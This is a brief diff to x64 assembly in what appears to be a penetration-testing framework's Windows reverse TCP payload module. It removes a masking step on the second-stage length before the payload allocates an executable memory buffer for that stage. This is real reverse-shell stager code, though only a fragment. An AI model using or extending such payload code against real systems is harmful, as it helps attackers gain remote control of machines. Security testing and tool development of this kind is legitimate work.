@@ -173,8 +173,6 @@ module Payload::Windows::ReverseTcp_x64
         add rsp, 32            ; we restore RSP from the api_call so we can pop off RSI next
         ; Alloc a RWX buffer for the second stage
         pop rsi                ; pop off the second stage length
-        mov rcx, 0FFFFFFFFh    ; load mask on rcx
-        and rsi, rcx           ; apply mask
         push 0x40              ; 
         pop r9                 ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; 
